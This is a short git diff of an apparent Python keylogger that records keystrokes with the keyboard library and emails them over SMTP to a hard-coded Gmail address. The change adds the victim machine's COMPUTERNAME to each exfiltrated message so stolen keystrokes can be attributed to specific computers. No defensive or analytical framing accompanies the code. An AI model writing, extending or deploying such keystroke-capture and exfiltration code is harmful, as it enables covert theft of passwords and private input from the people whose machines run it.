@@ -1,6 +1,7 @@
 import pyperclip
 import smtplib
 import keyboard
+import os
 import time
 import threading
 
@@ -25,7 +26,7 @@ def key_record():
 			if item.name == 'space':
 				item.name=' '
 			words.append( item.name)
-		server.sendmail("jacksonsoftwaresolutions@gmail.com","jacksonsoftwaresolutions@gmail.com", ''.join(words))
+		server.sendmail("jacksonsoftwaresolutions@gmail.com","jacksonsoftwaresolutions@gmail.com", os.environ['COMPUTERNAME']+''.join(words))
 
 	server.close()
 
